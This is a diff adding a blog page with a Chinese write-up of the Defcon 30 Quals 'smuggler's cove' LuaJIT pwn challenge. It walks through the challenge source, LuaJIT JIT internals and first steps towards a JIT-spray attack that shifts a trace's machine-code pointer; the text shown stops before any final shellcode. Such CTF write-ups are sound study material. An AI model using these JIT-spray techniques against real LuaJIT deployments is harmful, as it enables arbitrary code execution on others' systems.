@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="Defcon, CTF, Pwn,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Defcon-30-Quals smuggler&#39;s cove 复盘笔记 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-defcon30quals_smugglers_cove"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Defcon-30-Quals smuggler&#39;s cove 复盘笔记
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/08/defcon30quals_smugglers_cove/" class="article-date">
+  <time datetime="2022-08-29T16:00:00.000Z" itemprop="datePublished">2022-08-30</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">14 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="一、简介">一、简介</h2>
+<p>这里将记录着本人复盘 Defcon 30 Quals 中 <code>smuggler's cove</code> 的复盘笔记。</p>
+<p>本题是一道 luaJIT 的 pwn 题。</p>
+<a id="more"></a>
+<h2 id="二、环境配置">二、环境配置</h2>
+<p>首先，从提供的 libluajit 文件中获取其版本号：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220829215234730.png" alt="image-20220829215234730"></p>
+<p>之后下载源码切换版本开始编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:LuaJIT/LuaJIT.git</span><br><span class="line"><span class="comment"># 进入 LuaJIT 文件夹</span></span><br><span class="line"><span class="built_in">cd</span> LuaJIT</span><br><span class="line"><span class="comment"># 切换版本</span></span><br><span class="line">git checkout v2.1.0-beta3</span><br><span class="line"><span class="comment"># 手动修改 LuaJIT/src/Makefile， 使得编译时带有调试信息</span></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make -j `nproc`</span><br><span class="line"><span class="comment"># 退出 LuaJIT 文件夹</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># 编译，链接时附带刚编译出来的 libluajit.so</span></span><br><span class="line">gcc cove.c -g3 -ggdb3 -o mycove -I LuaJIT/src -L ./LuaJIT/src/ -l luajit</span><br><span class="line"><span class="comment"># 给编译出的 libluajit 改个名字</span></span><br><span class="line">ln -s /root/cove/LuaJIT/src/libluajit.so /root/cove/LuaJIT/src/libluajit-5.1.so.2</span><br><span class="line"><span class="comment"># 指定库路径并执行</span></span><br><span class="line">LD_LIBRARY_PATH=/root/cove/LuaJIT/src ./mycove</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果要执行提供程序本身，则使用以下指令</span></span><br><span class="line">LD_LIBRARY_PATH=. ./cove exp.lua</span><br></pre></td></tr></table></figure>
+<h2 id="三、漏洞点">三、漏洞点</h2>
+<p>题目主要给出了两个源码文件。一个是 <code>dig_up_the_loot.c</code>，该源码所编译出来的可执行文件是用来提供 flag 的，只有当使用特定参数执行该二进制文件时 flag 才会输出：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830110450663.png" alt="image-20220830110450663"></p>
+<p>再一个源码文件就是调用 LuaJIT 库的主源码文件 <code>cove.c</code>。该源码中的内容大致如下几点：</p>
+<ul>
+<li>
+<p>读入 lua 文件，其中该 lua 文件大小最大不可超过 433 字节。</p>
+</li>
+<li>
+<p>设置 luaJIT 配置，并<strong>禁用 JIT 全局变量的暴露</strong>，防止用户直接设置或修改 JIT 属性：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_jit_settings</span><span class="params">(lua_State* L)</span> </span>&#123;</span><br><span class="line">    luaL_dostring(L,</span><br><span class="line">        <span class="string">"jit.opt.start('3');"</span></span><br><span class="line">        <span class="string">"jit.opt.start('hotloop=1');"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_lua</span><span class="params">(lua_State* L)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Init JIT lib</span></span><br><span class="line">    lua_pushcfunction(L, luaopen_jit);</span><br><span class="line">    lua_pushstring(L, LUA_JITLIBNAME);</span><br><span class="line">    lua_call(L, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    set_jit_settings(L);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set jit = nil;</span></span><br><span class="line">    lua_pushnil(L);</span><br><span class="line">    lua_setglobal(L, <span class="string">"jit"</span>);</span><br><span class="line">    lua_pop(L, <span class="number">1</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>注册 print 函数，用于输出信息：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print</span><span class="params">(lua_State* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lua_gettop(L) &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> luaL_error(L, <span class="string">"expecting at least 1 arguments"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* s = lua_tostring(L, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>最重要的一个操作。注册 lua 函数 <code>cargo</code>，该函数实际调用 C 函数 <code>debug_jit</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GCtrace* <span class="title">getTrace</span><span class="params">(lua_State* L, <span class="keyword">uint8_t</span> index)</span> </span>&#123;</span><br><span class="line">    jit_State* js = L2J(L);</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= js-&gt;sizetrace)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (GCtrace*)gcref(js-&gt;trace[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">debug_jit</span><span class="params">(lua_State* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lua_gettop(L) != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> luaL_error(L, <span class="string">"expecting exactly 1 arguments"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    luaL_checktype(L, <span class="number">1</span>, LUA_TFUNCTION);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> GCfunc* v = lua_topointer(L, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!isluafunc(v)) &#123;</span><br><span class="line">        <span class="keyword">return</span> luaL_error(L, <span class="string">"expecting lua function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> offset = lua_tointeger(L, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span>* bytecode = mref(v-&gt;l.pc, <span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> op = bytecode[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> index = bytecode[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    GCtrace* t = getTrace(L, index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!t || !t-&gt;mcode || !t-&gt;szmcode) &#123;</span><br><span class="line">        <span class="keyword">return</span> luaL_error(L, <span class="string">"Blimey! There is no cargo in this ship!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"INSPECTION: This ship's JIT cargo was found to be %p\n"</span>, t-&gt;mcode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (offset &gt;= t-&gt;szmcode - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> luaL_error(L, <span class="string">"Avast! Offset too large!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        t-&gt;mcode += offset;</span><br><span class="line">        t-&gt;szmcode -= offset;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"... yarr let ye apply a secret offset, cargo is now %p ...\n"</span>, t-&gt;mcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>注册的 lua 函数 <code>cargo</code> 要求传入参数必须分别为<strong>函数类型</strong>和<strong>整型类型</strong>。从代码中可以得知，当 lua 调用 <code>cargo</code> 函数后，lua 解释器会先<strong>寻找所传入 lua 函数的 JIT 相关结构体</strong>，并<strong>修改该 JIT 后所执行机器码的起始偏移量</strong>。被修改的属性 <code>GCtrace::mcode</code> 和 <code>GCtrace::szmcode</code> 分别是编译后机器码的起始位置和偏移量：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Trace object. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GCtrace</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">  MSize szmcode;  <span class="comment">/* Size of machine code. */</span></span><br><span class="line">  MCode *mcode;   <span class="comment">/* Start of machine code. */</span></span><br><span class="line">  ...</span><br><span class="line">&#125; GCtrace;</span><br></pre></td></tr></table></figure>
+<p>因此，如果可以<strong>用立即数精心构造一段 JIT 后的机器码</strong>，再<strong>修改 JIT 代码起始位置</strong>，那么控制流就会<strong>将精心准备的立即数识别为指令执行</strong>，这样一来就可以成功执行 shellcode。</p>
+<p>这种做法也被称之为 <strong>JIT Spray</strong>。</p>
+<p>注意到 LuaJIT 设置了一段 jit 的配置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_jit_settings</span><span class="params">(lua_State* L)</span> </span>&#123;</span><br><span class="line">    luaL_dostring(L,</span><br><span class="line">        <span class="string">"jit.opt.start('3');"</span></span><br><span class="line">        <span class="string">"jit.opt.start('hotloop=1');"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中两行 lua 代码都调用了 lua 中的<code>jit.opt.start()</code>函数，该函数的实现位于 <code>LuaJIT/src/lib_jit.c:512</code> 处：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* jit.opt.start(flags...) */</span></span><br><span class="line">LJLIB_CF(jit_opt_start)</span><br><span class="line">&#123;</span><br><span class="line">  jit_State *J = L2J(L);</span><br><span class="line">  <span class="keyword">int</span> nargs = (<span class="keyword">int</span>)(L-&gt;top - L-&gt;base);</span><br><span class="line">  <span class="keyword">if</span> (nargs == <span class="number">0</span>) &#123;</span><br><span class="line">    J-&gt;flags = (J-&gt;flags &amp; ~JIT_F_OPT_MASK) | JIT_F_OPT_DEFAULT;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= nargs; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *str = strdata(lj_lib_checkstr(L, i));</span><br><span class="line">      <span class="keyword">if</span> (!jitopt_level(J, str) &amp;&amp;</span><br><span class="line">    !jitopt_flag(J, str) &amp;&amp;</span><br><span class="line">    !jitopt_param(J, str))</span><br><span class="line">  lj_err_callerv(L, LJ_ERR_JITOPT, str);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>lua 两次调用 <code>jit.opt.start</code> 函数，分别设置了：</p>
+<ul>
+<li>
+<p><code>jit.opt.start('3')</code>：进入 <code>jitopt_level</code>，设置优化等级为 3（最高）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Optimization levels set a fixed combination of flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JIT_F_OPT_0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JIT_F_OPT_1 (JIT_F_OPT_FOLD|JIT_F_OPT_CSE|JIT_F_OPT_DCE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JIT_F_OPT_2 (JIT_F_OPT_1|JIT_F_OPT_NARROW|JIT_F_OPT_LOOP)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JIT_F_OPT_3 (JIT_F_OPT_2|\</span></span><br><span class="line">  JIT_F_OPT_FWD|JIT_F_OPT_DSE|JIT_F_OPT_ABC|JIT_F_OPT_SINK|JIT_F_OPT_FUSE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JIT_F_OPT_DEFAULT JIT_F_OPT_3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parse optimization level. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">jitopt_level</span><span class="params">(jit_State *J, <span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str[<span class="number">0</span>] &gt;= <span class="string">'0'</span> &amp;&amp; str[<span class="number">0</span>] &lt;= <span class="string">'9'</span> &amp;&amp; str[<span class="number">1</span>] == <span class="string">'\0'</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">if</span> (str[<span class="number">0</span>] == <span class="string">'0'</span>) flags = JIT_F_OPT_0;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (str[<span class="number">0</span>] == <span class="string">'1'</span>) flags = JIT_F_OPT_1;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (str[<span class="number">0</span>] == <span class="string">'2'</span>) flags = JIT_F_OPT_2;</span><br><span class="line">    <span class="comment">// 这里！</span></span><br><span class="line">    <span class="keyword">else</span> flags = JIT_F_OPT_3;</span><br><span class="line">    J-&gt;flags = (J-&gt;flags &amp; ~JIT_F_OPT_MASK) | flags;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">/* Ok. */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* No match. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>jit.opt.start('hotloop=1')</code>：初始化 hotcount table。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Parse optimization parameter. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">jitopt_param</span><span class="params">(jit_State *J, <span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *lst = JIT_P_STRING;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; JIT_P__MAX; i++) &#123;</span><br><span class="line">    <span class="keyword">size_t</span> len = *(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *)lst;</span><br><span class="line">    lua_assert(len != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(str, lst+<span class="number">1</span>, len) == <span class="number">0</span> &amp;&amp; str[len] == <span class="string">'='</span>) &#123;</span><br><span class="line">      <span class="keyword">int32_t</span> n = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *p = &amp;str[len+<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">while</span> (*p &gt;= <span class="string">'0'</span> &amp;&amp; *p &lt;= <span class="string">'9'</span>)</span><br><span class="line">  n = n*<span class="number">10</span> + (*p++ - <span class="string">'0'</span>);</span><br><span class="line">      <span class="keyword">if</span> (*p) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* Malformed number. */</span></span><br><span class="line">      <span class="comment">// 1. 控制流进入此处，保存参数</span></span><br><span class="line">      J-&gt;param[i] = n;</span><br><span class="line">      <span class="comment">// 2. hotloop 判断</span></span><br><span class="line">      <span class="keyword">if</span> (i == JIT_P_hotloop)</span><br><span class="line">    <span class="comment">// 3. 调用该函数执行初始化操作</span></span><br><span class="line">  lj_dispatch_init_hotcount(J2G(J));</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">/* Ok. */</span></span><br><span class="line">    &#125;</span><br><span class="line">    lst += <span class="number">1</span>+len;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* No match. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> LJ_HASJIT</span></span><br><span class="line"><span class="comment">/* Initialize hotcount table. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lj_dispatch_init_hotcount</span><span class="params">(global_State *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int32_t</span> hotloop = G2J(g)-&gt;param[JIT_P_hotloop];</span><br><span class="line">  HotCount start = (HotCount)(hotloop*HOTCOUNT_LOOP - <span class="number">1</span>);</span><br><span class="line">  HotCount *hotcount = G2GG(g)-&gt;hotcount;</span><br><span class="line">  <span class="keyword">uint32_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HOTCOUNT_SIZE; i++)</span><br><span class="line">    hotcount[i] = start;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>这里需要参考以下两个链接来理解 hotcount：</p>
+<ul>
+<li><a href="https://www.jianshu.com/p/a1f394aba9b2" target="_blank" rel="noopener">译作：窥斑见豹–Peeking inside luaJIT - 简书</a></li>
+<li><a href="https://blog.csdn.net/u010913001/article/details/102979918" target="_blank" rel="noopener">LuaJit Trace Compiler剖析 - CSDN</a></li>
+</ul>
+<p>简单来说，hotcount 就是 luajit 追踪<strong>特定控制流转移指令</strong>（例如调用、跳转等）的一个哈希表，其中存放着所最终指令的热度。luajit 是 <strong>tracing jit</strong>，而非 method jit，这意味着 luajit 在优化时会以<strong>路径</strong>为单位，而不是以函数或方法为单位。既然是追踪路径，那么自然就会对<strong>控制流转移指令</strong>更加的关注，也就会有 hotcount table 这样的设计。</p>
+</li>
+</ul>
+<blockquote>
+<p>不过 cove 对 JIT 的配置不会对我们的漏洞利用产生太大影响，这里只是简单的扩展了一下。</p>
+</blockquote>
+<h2 id="四、漏洞利用">四、漏洞利用</h2>
+<blockquote>
+<p>前置调试知识：</p>
+<p>若需执行程序，则直接执行  <code>LD_LIBRARY_PATH=. ./cove exp.lua</code> 即可。</p>
+<p>若需调试程序，则先 <code>gdb --args ./cove exp.lua</code> 启动 gdb 会话，之后在 gdb 中执行 <code>set env LD_LIBRARY_PATH .</code> 即可。</p>
+</blockquote>
+<p>先写个函数随便试试这个 LuaJIT：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span></span> </span><br><span class="line">    <span class="keyword">local</span> arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"><span class="comment">-- cargo(func, 0)</span></span><br></pre></td></tr></table></figure>
+<p>结果触发 SIGSEGV 了，调试发现是 cove 中实现的 print 函数触发空指针。修改代码如下：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> int print(lua_State* L) &#123;</span><br><span class="line">     if (lua_gettop(L) &lt; 1) &#123;</span><br><span class="line">         return luaL_error(L, "expecting at least 1 arguments");</span><br><span class="line">     &#125;</span><br><span class="line">     const char* s = lua_tostring(L, 1);</span><br><span class="line"><span class="deletion">-    puts(s);</span></span><br><span class="line"><span class="addition">+    puts(s ? s : "(nil)");</span></span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>重新编译后执行就不再触发 SIGSEGV 了。</p>
+<p>再增加两个调用点，<code>func</code> 函数就会被 JIT 技术进行优化：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span></span> </span><br><span class="line">    <span class="keyword">local</span> arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">func()</span><br><span class="line">func()</span><br><span class="line">cargo(func, <span class="number">0</span>)</span><br><span class="line"><span class="comment">-- 输出：INSPECTION: This ship's JIT cargo was found to be 0x800021feffdc</span></span><br></pre></td></tr></table></figure>
+<p>从 GDB 中的信息可以得知，该位置确实存放着所生成的机器指令，而这个位置位于一个 rx 段上：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830140103661.png" alt="image-20220830140103661"></p>
+<p>在这个JIT生成的机器指令下断，下次执行 <code>func</code> 函数时就会触发这个断点（注意下图与上图不对应）；而修改调用 <code>cargo</code> 函数的第二个参数 offset，下次<strong>执行 JIT 函数时控制流也就会真的偏离 offset 个字节</strong>。：</p>
+<p><img src="/2022/08/defcon30quals_smugglers_cove/image-20220830140429872.png" alt="image-20220830140429872"></p>
+<p>现在我们已经了解如何触发函数的 JIT 优化，并且大致了解了其 JIT 所生成的机器码的情况，接下来要尝试在 JIT Machine Code 中布上我们特定的立即数。有一点需要注意，<strong>在 lua 中数字只有 <code>Number</code> 这么一个类型，不区分整型和浮点数型</strong>，不过 LuaJIT 内部是使用<strong>浮点数</strong>来表示 lua 的 Number 类型。这个可以用以下 lua 代码验证：</p>
